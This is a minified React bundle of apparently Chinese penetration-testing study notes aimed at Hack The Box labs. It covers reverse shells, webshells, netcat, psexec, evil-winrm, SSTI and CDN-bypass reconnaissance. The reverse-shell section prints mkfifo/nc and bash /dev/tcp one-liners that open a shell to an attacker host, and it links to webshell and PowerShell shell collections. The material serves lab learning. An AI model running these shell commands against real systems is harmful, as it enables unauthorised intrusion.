                  \u4E4B\u540E\uFF0C\u9700\u8981 \u8F93\u5165 \u5BC6\u7801


          `),t.get_\u548C_lget=`

`.concat(t.\u73AF\u5883\u51C6\u5907,`

              \u65E7\u7248\u7528\u3010get\u3011

              \u65B0\u7248\u7528\u3010lget\u3011

  `),t.GetNPUsers=`


  `,t["smbserver.py"]=`

              \u5C06\u4F1A\u5728\u672C\u673A\uFF0C\u5FEB\u901F\u542F\u52A8\u4E00\u4E2A\u3010SMB\u670D\u52A1\u3011\uFF1B\u4EE5\u63D0\u4F9B\u7ED9\u5176\u5B83\u673A\u5668\uFF0C\u8FDB\u884C\u8BFB\u53D6\u3002

              python3  smbserver.py -smb2support -username  <\u7528\u6237\u540D\u5982guest>  -password  <\u5BC6\u7801\u5982guest>  share  /root/htb


  `,t["lookupsid.py"]=`
              python3  lookupsid.py  <\u7528\u6237\u540D>:<\u5BC6\u7801>@<IP\u5730\u5740>
  `;var s={name:"\u3010Shell\u3011_\u3010ReverseShell\u3011_\u3010\u53CD\u5411\u4EE3\u7406\u3011_\u624B\u518C",steps:[{name:"\u300A\u6E05\u5355\u300B\u2014\u2014\u5E38\u89C1\u3010\u53CD\u5411\u4EE3\u7406\u3011\uFF0C\u5927\u5168\u6536\u96C6",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,j.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u53EF\u80FD\u662F\u4E16\u754C\u4E0A\uFF0C\u6700\u5168\u7684\u4E00\u4EFD Reverse Shell \u53CD\u5411\u4EE3\u7406\uFF0Cdemo\u6E05\u5355\uFF1A
              PayloadsAllTheThings/Reverse Shell Cheatsheet.md at master \xB7 swisskyrepo/PayloadsAllTheThings
                  https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

          \u53E6\u5916\u4E00\u4EFD\uFF0C\u4E5F\u6781\u4E3A\u4E30\u5BCC\u7684\uFF0Cshell\u6E05\u5355\uFF1A\uFF08\u4F3C\u4E4E\u662F\u56FD\u4EBA\uFF0C\u5728\u7EF4\u62A4\u7684\uFF09
              tennc/webshell
                  https://github.com/tennc/webshell

          \u4E00\u4E9B\u96F6\u661F\u7684\u811A\u672C\u6536\u96C6\uFF1A
              \u3010PowerShell\u3011\u7684shell\u811A\u672C\uFF1A
                  Nishang\u63D0\u4F9B\u7684\u4E00\u4E2A\uFF1Ahttps://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1

          HTB_\u63D0\u4F9BWebShell
              "/usr/share/webshells"

                  /php                                              \uFF08PHP\uFF09
                      /php-reverse-shell.php


          `))},{name:"\u3010\u4E00\u53E5\u8BDD\u6728\u9A6C\u3011/\u3010\u5C0F\u9A6C\u3011/\u3010\u5927\u9A6C\u3011",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,j.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`


              \u4E00\u53E5\u8BDD\u6728\u9A6C
                  \u5404\u79CD\u8BED\u8A00\u7684\u3010\u4E00\u53E5\u8BDD\u6728\u9A6C/shell\u3011
                      [Reverse Shell Cheat Sheet | pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

                  \u6BD4\u5982\u4E00\u4E9B\u3010\u751F\u50FB\u3011\u7684
                      \u3010rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <\u653B\u51FB\u673AIP> <\u653B\u51FB\u673A\u6B63\u76D1\u542C\u7AEF\u53E3> >/tmp/f\u3011
                          \u5728\u8FD9\u4E2A\u5217\u8868\u91CC\u9762\uFF0C\u4E5F\u6709\u3002
                          \u5DE5\u4F5C\u539F\u7406\uFF1A
                              \u300Ahttps://unix.stackexchange.com/questions/406683/how-does-this-command-work-mkfifo-tmp-f-cat-tmp-f-bin-sh-i-21-nc-l\u300B


              \u5C0F\u9A6C

                  \u6536\u96C6\u5217\u8868\uFF1A
                      \u7B2C\u4E00\u4E2A\uFF1Ahttps://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php


              \u5927\u9A6C



              \u63D0\u5347\u529F\u80FDshell
                  \u89C1\u3010\u63D0\u5347 \u529F\u80FDshell\u3011


          `))},{name:"\u63D0\u5347 \u3010\u529F\u80FDshell\u3011",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,j.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u529F\u80FDshell

              \u4ECB\u7ECD\uFF1A
                  \u6BD4\u3010netcat\u3001nc\u3011\u53EF\u80FD\u66F4\u5177\u5F3A\u5927\u529F\u80FD
                      \u6BD4\u5982\u3010\u547D\u4EE4\u63D0\u793A\u3011\u3001\u3010\u5386\u53F2\u8BB0\u5F55\u3011\uFF0C\u7B49
                      \u6BD4\u5982\u3010vi\u3011\u7F16\u8F91
                      \u6BD4\u5982\u3010su\u3011\u547D\u4EE4
                      \u6BD4\u5982\u3010Ctrl+C\u3011\u4EC5\u9000\u51FA\u6700\u4E0A\u4E00\u5C42

          \u5E38\u89C1\u8BED\u53E5

              python3 -c 'import pty;pty.spawn("/bin/bash")'
                  \u4F7F\u7528\u573A\u666F\uFF1A
                      1. \u5728\u3010netcat\u3001nc\u3011\u8FDE\u63A5\u4E0A\uFF0C\u4E4B\u540E\u8FD0\u884C

              bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"
                  \u4F7F\u7528\u573A\u666F\uFF1A
                      1. \u5728\u3010sqlmap \u7684 os-shell\u3011\u4E4B\u540E\u3002

                  \u9700\u8981\u914D\u5408\u7684\uFF1A
                      \u5728\u672C\u5730\uFF0C\u542F\u52A8\u4E00\u4E2A\u3010nc\u76D1\u542C\u3011

              script  /dev/null  -c  bash
                  \u4F7F\u7528\u573A\u666F\uFF1A
                      1. \u5229\u7528\u3010log4j\u6F0F\u6D1E \u2014\u2014 RogueJndi/rogue-jndi\u3011\uFF0C\u5229\u7528\u3010jndi:ldap\u3011\u6240\u8FD4\u56DE\u7684\u3010shell\u3011\u4E2D

              \u66F4\u9AD8\u7EA7\u7684\uFF1A
                  \u5B8C\u5168\u4F53\u4EA4\u4E92
                      \u7B2C\u4E00\u6B65\uFF0C\u3010python3 -c 'import pty;pty.spawn("/bin/bash")'\u3011
                      \u7B2C\u4E8C\u6B65\uFF0C\u8F93\u5165\u3010CTRL+Z\u3011
                      \u7B2C\u4E09\u6B65\uFF0C\u8F93\u5165\u3010stty raw -echo\u3011
                      \u7B2C\u56DB\u6B65\uFF0C\u8F93\u5165\u3010fg\u3011
                          1.
                      \u7B2C\u4E94\u6B65\uFF0C\u8F93\u5165\u3010export TERM=xterm\u3011
                          1. \u6CE8\u610F\uFF0C\u5728\u8F93\u5165\u4E4B\u524D\uFF0C\u53EF\u80FD\u754C\u9762\u663E\u793A\u6709\u70B9\u5947\u602A\uFF1B\u4F46\u4E0D\u7528\u62C5\u5FC3

          `))},{name:"\u3010netcat\u3011 / \u3010nc\u3011",desc:l.a.createElement(l.a.Fragment,null),steps:[{name:"\u4F7F\u7528\u65B9\u6CD5\uFF08\u901A\u7528\uFF09",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,j.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          netcat
              \u8FDE\u63A5TCP

              \u8FDE\u63A5UDP



          \u63A5\u6536\u65B9

              \u57FA\u672C\u4F7F\u7528\uFF1A
                  \u67E5\u770B\u5E2E\u52A9
                      nc  -h

                  \u542F\u52A8\u76D1\u542C
                      nc  -lvnp  <\u7AEF\u53E3>

              \u5E38\u89C1\u9009\u9879
                  \u300A-l\u300B\uFF0C\u76D1\u542C\u6A21\u5F0F
                  \u300A-v\u300B\uFF0C\u663E\u793A\u65E5\u5FD7
                  \u300A-n\u300B\uFF0C\u4F7F\u7528\u3010\u7EAF\u6570\u5B57IP\u5730\u5740\u3011\u3001\u4E0D\u4F7F\u7528\u3010\u4E3B\u673A\u540Dhostname\u89E3\u6790\u3011
                  \u300A-p\u300B\uFF0C\u6307\u5B9A\u76D1\u542C\u7AEF\u53E3

                  \u300A-u\u300B\uFF0C\u4F7F\u7528 UDP\u6A21\u5F0F

          \u53D1\u9001\u65B9

              123


          `))},{name:"Linux\u7248 netcat",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,j.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

              `))},{name:"Windows\u7248 netcat",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,j.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
              \u3010nc.exe\u3011\u4E0B\u8F7D\u5730\u5740\uFF1A
                  \u7F51\u9875\u9875\u9762\uFF1Ahttps://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post_page-----a2ddc3557403----------------------
                  exe\u4E0B\u8F7D\u5730\u5740\uFF1Ahttps://github.com/int0x33/nc.exe/raw/master/nc64.exe

              `))}]},{name:"\u3010psexec\u3011 / \u3010psexec.py\u3011",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,j.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(t["psexec.py"]))},{name:"\u3010evil-winrm\u3011 / \u3010EvilWinrm\u3011",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,j.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u8D44\u6599\uFF1Ahttps://github.com/Hackplayers/evil-winrm

          \u517C\u5BB9 Linux \u548C Windows \u5BA2\u6237\u7AEF\u7CFB\u7EDF

          `))}]},m=s},3:function(nu,U){},4:function(nu,U){},"4MH1":function(nu,U,f){"use strict";f.d(U,"a",function(){return j});var R=f("fWQN"),h=f("q1tI"),l=f.n(h),j=function n(){Object(R.a)(this,n)};j.SSTI={\u4ECB\u7ECD:"Server-Side Template Injection",\u76F8\u5173\u6280\u5DE7:l.a.createElement(l.a.Fragment,null,`
    https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#handlebars-nodejs

    \u8FDB\u4E00\u6B65\uFF1A
        \u6709\u65F6\u5019\uFF0C\u4F1A\u9047\u5230\u3010require\u3011\u65E0\u6CD5\u8BBF\u95EE\u7684\u95EE\u9898\u3002\u6B64\u65F6\uFF0C\u53EF\u80FD\u662F\u9047\u5230\u4E86\u3010\u6C99\u76D2\u6A21\u5F0F\u3011

        \u7136\u540E\uFF0C\u3010require("process").exec\u3011\u6709\u65F6\u5019\uFF0C\u65E0\u6CD5\u7ACB\u5373\u5F97\u5230\u7ED3\u679C\uFF1A
            1. exec\uFF0C      \u662F\u3010\u5F02\u6B65\u65B9\u6CD5\u3011
            2. execSync\uFF0C  \u662F\u3010\u540C\u6B65\u65B9\u6CD5\u3011

    `)},j.Jenkins=l.a.createElement(l.a.Fragment,null,`
              \u8A79\u91D1\u65AF-HackTricks
                  https://book.hacktricks.xyz/pentesting/pentesting-web/jenkins
  `),j.mssql_sqlserver=l.a.createElement(l.a.Fragment,null,`
      MSSQL - Microsoft SQL Server
          https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server
  `),j.CodeReview_\u4EE3\u7801\u5BA1\u8BA1={\u8BB0\u5F55\u7684_\u5BA1\u8BA1\u5DE5\u5177:l.a.createElement(l.a.Fragment,null,`
      \u5BA1\u8BA1\u5DE5\u5177\uFF1A

          https://book.hacktricks.xyz/pentesting/pentesting-web/code-review-tools
    `),\u5728\u7F51\u9875\u5BA1\u8BA1\u4E2D_\u4ECB\u4E8E\u767D\u76D2\u548C\u9ED1\u76D2\u4E4B\u95F4:l.a.createElement(l.a.Fragment,null,`
      \u5728\u7F51\u9875\u5BA1\u8BA1\u4E2D\uFF0C\u4ECB\u4E8E\u767D\u76D2\u548C\u9ED1\u76D2\u4E4B\u95F4\uFF1A

          https://book.hacktricks.xyz/pentesting/pentesting-web#source-code-review
    `),\u4E91\u5B89\u5168_CloudSecurity:l.a.createElement(l.a.Fragment,null,`
      \u3010\u4E91\u5B89\u5168\u3011\u4EE3\u7801\u5BA1\u8BA1\uFF1A

          https://book.hacktricks.xyz/cloud-security/cloud-security-review
    `)}},5:function(nu,U){},"550Q":function(nu,U,f){"use strict";f.d(U,"c",function(){return K}),f.d(U,"a",function(){return S}),f.d(U,"b",function(){return T});var R=f("DZo9"),h=f("8z0m"),l=f("+L6B"),j=f("2/Rp"),n=f("5NDa"),u=f("5rEg"),t=f("miYZ"),s=f("tsqr"),m=f("tJVT"),F=f("Mwp2"),k=f("VXEj"),o=f("tU7J"),c=f("wFql"),b=f("/zsF"),e=f("PArb"),v=f("k1fw"),D=f("q1tI"),d=f.n(D),A=f("z7Xi"),E=f("yvwo"),C=f.n(E),y=f("CW61"),_=f("q4c3"),O=f("ysNt"),B=f("thHx"),r=f.n(B),P=function(q){var G=q.children;return d.a.createElement("span",{className:r.a.circleSketchHighlight,style:{fontSize:"40px"}},G)},p=O.e.getHighlightedText,z={\u6807\u9898\u6587\u672C\u4E0D\u6362\u884C:"nowrap"};function N(H){return O.e.check_isString(H)?d.a.createElement("pre",null,H):H}var K=function(q){var G=q.type,ju=q.widthPx,$=ju===void 0?75:ju,au=q.coverPosition,uu=q.style,eu=q.orientation,iu=eu===void 0?"center":eu,hu={A:f("KlFh"),B:f("Yz1M"),C:f("ZfPh")};return d.a.createElement(e.a,{orientation:iu,style:Object(v.a)({},uu)},d.a.createElement("img",{style:{width:"".concat($,"px"),height:"".concat($,"px"),borderRadius:"50%",objectFit:"cover",objectPosition:au?"0%    ".concat(au,"%"):void 0},src:hu[G],alt:""}))},S=function(q){var G=q.matchedKoans,ju=q.highlight_keyArr;return d.a.createElement(d.a.Fragment,null,d.a.createElement(k.b,{bordered:!0,dataSource:G,renderItem:function(au){return d.a.createElement(k.b.Item,{style:{display:"flex",flexDirection:"column",alignItems:"flex-start"}},d.a.createElement("div",{style:{width:"100%",display:"flex",justifyContent:"space-between",alignItems:"flex-start"}},d.a.createElement("div",{style:{display:"flex",whiteSpace:z.\u6807\u9898\u6587\u672C\u4E0D\u6362\u884C}},d.a.createElement(c.a.Text,{mark:!0},"[\u5EFA\u8BAE]"),d.a.createElement("span",{style:{marginLeft:"3px",whiteSpace:z.\u6807\u9898\u6587\u672C\u4E0D\u6362\u884C}},au.keyWCfg.desc)),function(){var uu;if(ju&&ju.length>0){var eu=p(au.keyWCfg.keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5.toString(),ju);uu=eu.map(function(iu){return iu.isEqual?d.a.createElement(P,null,iu.part):d.a.createElement(d.a.Fragment,null,iu.part)})}else uu=au.keyWCfg.keyW_regexp_\u53EF\u4EE5\u4F7F\u7528\u5DF2\u5C01\u88C5\u65B9\u6CD5.toString();return d.a.createElement("span",{style:{fontSize:"12px"}},uu)}()),d.a.createElement(K,{orientation:"left",type:"A"}),function(){var uu=!!au.keyWCfg.\u76F8\u5173\u7EC4\u4EF6&&au.keyWCfg.\u76F8\u5173\u7EC4\u4EF6.length>0,eu=uu?{display:"flex",flexDirection:"row",justifyContent:"space-between"}:{display:"flex",flexDirection:"column"},iu={flex:"1 0 0"};return d.a.createElement("div",{style:Object(v.a)({width:"100%"},eu)},d.a.createElement("ol",{className:C.a.koanList,style:Object(v.a)({},iu)},function(){var hu=au.keyWCfg.koans_\u63D0\u793A,Ru=Array.isArray(hu)?hu.map(function(un){return d.a.createElement("li",null,N(un))}):d.a.createElement("li",null,N(hu));return Ru}()),uu&&d.a.createElement("div",{style:Object(v.a)({display:"flex",flexDirection:"column",alignItems:"flex-start",gap:"0.1em",width:"100%"},iu)},au.keyWCfg.\u76F8\u5173\u7EC4\u4EF6))}(),d.a.createElement(K,{orientation:"right",style:{marginTop:"7.5em"},type:"C",widthPx:75*3,coverPosition:171}))}}))},T=function(){var q=Object(D.useState)([]),G=Object(m.a)(q,2),ju=G[0],$=G[1],au={onChange:function(eu){console.log("\u6587\u4EF6\u4FE1\u606F",JSON.stringify(eu.file),eu.file,eu.fileList),eu.file.status!=="uploading"?(console.log("status","\u4E0D\u5728\u4E0A\u4F20"),y.a.trackKeyWords(eu.file.originFileObj).then(function(iu){$(iu)})):console.log("status","\u5728\u4E0A\u4F20"),eu.file.status==="done"?s.default.success("".concat(eu.file.name," file uploaded successfully")):eu.file.status==="error"&&s.default.error("".concat(eu.file.name," file upload failed."))}};return d.a.createElement(d.a.Fragment,null,d.a.createElement(u.a.TextArea,{onChange:function(eu){var iu=y.a.extract_keyword_from_fullTextString____\u9002\u7528\u4E8E\u539F\u7248\u5F88\u4E45\u4EE5\u524D\u7684\u6F0F\u6D1E\u67E5\u627E\u7CFB\u7EDF(eu.target.value,_.a);$(iu)}}),d.a.createElement(h.a,au,d.a.createElement(j.a,{icon:d.a.createElement(A.a,null)},"Click to Upload")),d.a.createElement(S,{matchedKoans:ju}))}},"6CFD":function(nu,U,f){"use strict";f.d(U,"c",function(){return F}),f.d(U,"a",function(){return b}),f.d(U,"b",function(){return p});var R=f("mtLc"),h=f("fWQN"),l=f("+BJd"),j=f("mr32"),n=f("q1tI"),u=f.n(n),t=f("ysNt"),s=t.e.singleATag_blank;function m(z){return u.a.createElement(j.a,{color:"magenta"},z)}var F;(function(z){z.\u7279\u5B9A\u89E6\u53D1\u6761\u4EF6="\u7279\u5B9A\u89E6\u53D1\u6761\u4EF6",z.\u653E\u5230\u6700\u540E\u8003\u8651="\u653E\u5230\u6700\u540E\u8003\u8651",z.\u5F85\u6574\u7406\u7684\u5DE5\u5177="\u5F85\u6574\u7406\u7684\u5DE5\u5177",z.\u8303\u56F4\u9605\u8BFB="\u8303\u56F4\u9605\u8BFB",z.\u4F18\u5148\u63A8\u8350\u4F7F\u7528="\u4F18\u5148\u63A8\u8350\u4F7F\u7528",z.\u4F01\u4E1A\u516C\u53F8\u5185\u90E8="\u4F01\u4E1A\u516C\u53F8\u5185\u90E8",z.\u9700\u8981\u91CD\u65B0\u4ECE\u89C6\u9891\u8865\u5145="\u9700\u8981\u91CD\u65B0\u4ECE\u89C6\u9891\u8865\u5145",z.\u6392\u5934\u5175="\u6392\u5934\u5175",z["\u8FD9\u662F\u6211\u5FFD\u89C6\u7684\uFF0C\u5F88\u91CD\u8981\u7684\u4E00\u70B9"]="\u8FD9\u662F\u6211\u5FFD\u89C6\u7684\uFF0C\u5F88\u91CD\u8981\u7684\u4E00\u70B9",z.\u5BF9\u7167\u7684\u5E95\u677F="\u5BF9\u7167\u7684\u5E95\u677F"})(F||(F={}));var k;(function(z){z["\u3010BurpSuite\u3011+\u3010XRay\u3011\u8054\u52A8\uFF0C\u6253\u51FA \u519B\u4F53\u62F3"]="\u3010BurpSuite\u3011+\u3010XRay\u3011\u8054\u52A8\uFF0C\u6253\u51FA \u519B\u4F53\u62F3",z["\u3010awvs\u3011+\u3010XRay\u3011\u8054\u52A8\uFF0C\u6253\u51FA \u519B\u4F53\u62F3"]="\u3010awvs\u3011+\u3010XRay\u3011\u8054\u52A8\uFF0C\u6253\u51FA \u519B\u4F53\u62F3"})(k||(k={}));var o=function z(){Object(h.a)(this,z)};o.\u9ED1\u6697\u5F15\u64CE_\u5217\u8868=function(){var z=[{name:"Fofa",url:"https://fofa.so/"},{name:"ZoomEye",url:"https://www.zoomeye.org/"},{name:"Shodan",url:"https://www.shodan.io/"},{name:"Binary Edge \uFF08\u6BD4Shodan\u641C\u7D22\u5185\u5BB9\u8FD8\u591A\uFF01\uFF09",url:"https://www.binaryedge.io/"},{name:"CenSys Search",url:"https://search.censys.io/"}];return{list:z,ui:u.a.createElement(u.a.Fragment,null,u.a.createElement("div",null,z.map(function(N){return u.a.createElement("span",{style:{marginRight:"1em"}},s(N.name,N.url))})),u.a.createElement("div",null,"\u7279\u6B8A\u6807\u8BC6\uFF1A",u.a.createElement("ol",null,u.a.createElement("li",null,"IDC\u8868\u793A\uFF1A",t.e.get_img(f("9IgH"),{max_height:"8em"})),u.a.createElement("li",null,"IP\u805A\u5408\u8868\u793A\uFF1A",t.e.get_img(f("1WT5"),{max_height:"8em"})),u.a.createElement("li",null,"\u65F6\u95F4\u67E5\u770B\u6240\u6709\u8868\u793A\uFF1A",t.e.get_img(f("h4Gq"),{max_height:"8em"}),u.a.createElement("ol",null,u.a.createElement("li",null,"\u7ECF\u5E38\u53EF\u4EE5\uFF0C\u6709\u610F\u5916\u7684\u53D1\u73B0"))),u.a.createElement("li",null,"\u67E5\u770B\u53EF\u80FD\u6F0F\u6D1E\uFF1A(ZoomEye)",t.e.get_img(f("VWeJ"),{max_height:"8em"})),u.a.createElement("li",null,u.a.createElement("br",null)),u.a.createElement("li",null,"\u67E5\u770B\u3010\u5355\u673A\u8BE6\u60C5\u3011:(FOFA)",s("fofa.so/hosts/<IP\u5730\u5740>")))))}}(),o.\u57FA\u672C={name:"\u9ED1\u6697\u641C\u7D22\u5F15\u64CE",desc:u.a.createElement(u.a.Fragment,null,"\u56DB\u5927\u9ED1\u6697\u641C\u7D22\u5F15\u64CE"),content:u.a.createElement(u.a.Fragment,null,o.\u9ED1\u6697\u5F15\u64CE_\u5217\u8868.ui)},o.\u57DF\u540D_\u6536\u96C6={name:"\u9ED1\u6697\u5F15\u64CE_\u57DF\u540D_\u6536\u96C6",content:u.a.createElement(u.a.Fragment,null,o.\u9ED1\u6697\u5F15\u64CE_\u5217\u8868.ui)},o.\u7AEF\u53E3_\u6536\u96C6={name:"\u9ED1\u6697\u5F15\u64CE_\u7AEF\u53E3_\u6536\u96C6",content:u.a.createElement(u.a.Fragment,null,o.\u9ED1\u6697\u5F15\u64CE_\u5217\u8868.ui)},o.\u65C1\u6CE8_\u53CD\u67E5IP={name:"\u9ED1\u6697\u5F15\u64CE_\u65C1\u6CE8_\u53CD\u67E5IP",content:u.a.createElement(u.a.Fragment,null,o.\u9ED1\u6697\u5F15\u64CE_\u5217\u8868.ui)},o.\u9891\u7387\u4ECB\u7ECD=u.a.createElement(u.a.Fragment,null,"\u722C\u7684\u9891\u7387\uFF0C\u6BD4\u5149\u660E\u5F15\u64CE\u66F4\u65B0\u4E00\u4E9B",u.a.createElement("br",null),"Google\uFF0C\u53EF\u80FD\u722C\u7684\u662F \u51E0\u5929\u4E4B\u524D",u.a.createElement("br",null),"\u9ED1\u6697\u5F15\u64CE\uFF0C\u53EF\u80FD\u5C31 \u51E0\u5206\u949F\u4E4B\u524D",u.a.createElement("br",null)),o.\u7279\u5B9A\u6587\u4EF6={name:"\u7279\u5B9A\u6587\u4EF6",content:u.a.createElement(u.a.Fragment,null,"\u54C8\u5E0C\u503C md5\u503C",u.a.createElement("ol",null,u.a.createElement("li",null)),"ico\u6587\u4EF6",u.a.createElement("ol",null,u.a.createElement("li",null,"\u57FA\u672C\u4ECB\u7ECD",u.a.createElement("ol",null,u.a.createElement("li",null,"Shodan\u514D\u8D39\u67E5\u627E",u.a.createElement("ol",null,u.a.createElement("li",null,"\u5BF9\u3010\u56FD\u5185\u7F51\u7AD9\u3011\uFF0C\u6210\u529F\u7387\u4E5F\u5F88\u9AD8\uFF01"))),u.a.createElement("li",null,"Fofa\u9700\u8981 \u51B2\u5230 \u9AD8\u7EA7\u4F1A\u5458\u3002",u.a.createElement("ol",null,u.a.createElement("li",null,"\u6682\u65F6\u6CA1\u5FC5\u8981\u7528 Fofa"))))),u.a.createElement("li",null,"\u539F\u7406",u.a.createElement("ol",null,u.a.createElement("li",null,"CDN\u672C\u8EAB\uFF0C\u4F1A\u7F13\u5B58\u5927\u90E8\u5206\u4E1C\u897F"),u.a.createElement("li",null,"\u4F46\u3010ico\u3011\u6587\u4EF6\uFF0C\u53EF\u80FD\u662F\u4E0D\u4F1A\u88AB\u7F13\u5B58\u7684"),u.a.createElement("li",null,"\u800C\u4E14\uFF0C\u3010Shodan\u3011\uFF0C\u672C\u8EAB\u4F1A\u5BF9 CDN \u505A\u4E00\u4E9B\u8FC7\u6EE4\uFF0C\u4FDD\u8BC1 \u5927\u90E8\u5206\u662F\u6CA1\u6709 CDN \u7684\u3002"))),u.a.createElement("li",null,"\u641C\u7D22 ico \u6587\u4EF6\uFF0C\u4EE5\u627E\u5230 \u771F\u5B9EIP \u3002"),u.a.createElement("li",null,"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null,"\u7528 Python \u811A\u672C\uFF0C\u751F\u6210 ico \u7684 md5\u3002\uFF08\u89C1 \u300AWangPan\u9879\u76EE\u300B \uFF09"),u.a.createElement("li",null,"\u8FDB\u5165\u3010",s("www.shodan.io/search?query=http.favicon.hash:<\u5904\u7406\u8FC7\u7684hash\u503C>"),"\u3011")))),u.a.createElement("br",null),o.\u9ED1\u6697\u5F15\u64CE_\u5217\u8868.ui)};var c=function(){function z(){Object(h.a)(this,z)}return Object(R.a)(z,null,[{key:"\u6E32\u67D3_\u76F4\u63A5\u653Eol_\u4E0D\u9700\u8981\u5305li",value:function(K){function S(T){return u.a.createElement("li",null,u.a.createElement("h3",{style:{textDecoration:"underline overline"}},T.name),u.a.createElement("ol",null,u.a.createElement("li",null,T.content)))}return K.steps?K.steps.map(function(T){return S(T)}):S(K)}}]),z}();c.asm_ca_com_\u8D85\u7EA7Ping={name:"asm_ca_com_\u8D85\u7EA7Ping",content:u.a.createElement(u.a.Fragment,null,"\u4ECB\u7ECD",u.a.createElement("ol",null,u.a.createElement("li",null,"\u5DF2\u8FC7\u65F6\uFF0C\u4E0D\u518D\u63D0\u4F9B\uFF08\u6211\u4E4B\u524D\uFF0C\u4E5F\u9047\u5230\u8FC7\u4E00\u6B21\uFF09")),"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null,"\u8FDB\u5165\u3010",s("asm.ca.com/en/ping.php"),"\u3011"),u.a.createElement("li",null,"\u56FD\u5BB6\u3001\u5730\u533A\u6570\u91CF\uFF0C\u6BD4\u8F83\u591A\u3002"),u.a.createElement("li",null,"\u514D\u8D39\u7684")))},c.tools_ipip_net_\u8D85\u7EA7Ping={name:"tools_ipip_net_\u8D85\u7EA7Ping",desc:u.a.createElement(u.a.Fragment,null,"\u6210\u529F\u7387\u771F\u7684\u4E0D\u9AD8\uFF1B\u67E5\u4E0D\u5230"),content:u.a.createElement(u.a.Fragment,null,u.a.createElement("ol",null,u.a.createElement("li",null,"\u8FDB\u5165\u3010",s("tools.ipip.net/cdn.php"),"\u3011"),u.a.createElement("li",null,"\u56FD\u5BB6\u3001\u5730\u533A\u6570\u91CF\uFF0C\u6BD4\u8F83\u591A\u3002"),u.a.createElement("li",null,"\u514D\u8D39\u7684")))},c.get_site_ip_\u771F\u5B9EIP_\u7B2C\u4E09\u65B9\u63A5\u53E3={name:"get_site_ip_\u771F\u5B9EIP_\u7B2C\u4E09\u65B9\u63A5\u53E3",content:u.a.createElement(u.a.Fragment,null,u.a.createElement("ol",null,u.a.createElement("li",null,"\u8FDB\u5165\u3010",s("get-site-ip.com","get-site-ip.com"),"\u3011"),u.a.createElement("li",null,"\u7B80\u5355\u7684\u83B7\u53D6IP\u5730\u5740"),u.a.createElement("li",null,"\u4E0D\u4E00\u5B9A\u5B8C\u5168\u51C6\u786E")))},c.zmap={name:"zmap",content:u.a.createElement(u.a.Fragment,null,"\u53F7\u79F0\u5168\u7F51\u641C\u7D22\u6740\u5668")},c.fuckcdn={name:"fuckcdn",desc:u.a.createElement(u.a.Fragment,null,"\u76F8\u5BF9\u800C\u8A00\uFF0C\u597D\u4E00\u4E9B"),content:u.a.createElement(u.a.Fragment,null,"Python\u5F00\u53D1\u7684",u.a.createElement("ol",null,u.a.createElement("li",null)),"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null,"\u914D\u7F6E\u6587\u4EF6"),u.a.createElement("li",null,"\u8F93\u5165 dig \u7684DNS\u89E3\u6790\u5730\u5740 \uFF08dig \u6BD4 lookup \u7684\u7ED3\u679C\u8981\u597D\uFF09")))},c.w8fuckcdn={name:"w8fuckcdn",desc:u.a.createElement(u.a.Fragment,null,"\u6709\u4E00\u4E9B\u5C0F\u95EE\u9898"),content:u.a.createElement(u.a.Fragment,null)},c.dnsdb_io_DNS\u89E3\u6790\u8BB0\u5F55={name:"dnsdb_io_DNS\u89E3\u6790\u8BB0\u5F55",content:u.a.createElement(u.a.Fragment,null,"\u4E5F\u53EF\u4EE5",u.a.createElement("ol",null,u.a.createElement("li",null)))},c.namelimit_com_DNS\u89E3\u6790\u8BB0\u5F55={name:"namelimit_com_DNS\u89E3\u6790\u8BB0\u5F55",content:u.a.createElement(u.a.Fragment,null,"\u4F7F\u7528",u.a.createElement("ol",null,u.a.createElement("li",null,"\u8FDB\u5165\u3010",s("namelimit.com/subdomain/lookup.name?domain=<\u57DF\u540D>"),"\u3011")))},c.WafW00f_\u8BC6\u522BWAF={name:"WafW00f",desc:u.a.createElement(u.a.Fragment,null,"\u8FD8\u5728\u66F4\u65B0",u.a.createElement("br",null),"\u652F\u6301\u9762\uFF0C\u6BD4\u5176\u4ED6\u5DE5\u5177\u8981\u597D\u4E00\u4E9B",